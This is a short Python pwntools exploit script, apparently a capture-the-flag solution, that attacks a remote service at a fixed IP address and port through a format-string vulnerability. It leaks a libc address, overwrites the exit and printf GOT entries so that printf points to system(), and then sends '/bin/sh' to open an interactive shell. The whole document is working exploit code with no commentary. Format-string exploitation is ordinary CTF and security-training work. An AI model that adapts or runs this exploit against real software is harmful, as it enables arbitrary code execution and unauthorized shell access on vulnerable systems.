from pwn import *

exit_got = 0x404030
printf_got = 0x404018
main = 0x4011b3

r = remote('140.110.112.77', 4004)
#r = process('fmt-3')
raw_input('debug: ')
payload = '%23$p' + '%{}c'.format(0x11b3 - 14) + '%10$hn' + 'a' * 8
payload += 'a' * (8 - (len(payload) % 8))
print(len(payload))
payload += p64(exit_got)
r.sendline(payload)
libc_base = int(r.recv(20).strip()[2:], 16) - 0x00007fe0483edb97 + 0x00007fe0483cc000 
libc_system = libc_base + 0x4f440
print('libc base: {}, libc system: {}'.format(hex(libc_base), hex(libc_system)))

num = (libc_system & 0xff0000) >> 16
num2 = (libc_system & 0xffff) - num
print(hex(num))
payload = '%{}c'.format(num) + '%16$hhn' + '%{}c'.format(num2) + '%15$hn'
payload = payload.ljust(72, 'a')
payload += p64(printf_got) + p64(printf_got + 2)
r.sendline(payload)

r.sendline('/bin/sh\x00')
r.interactive()
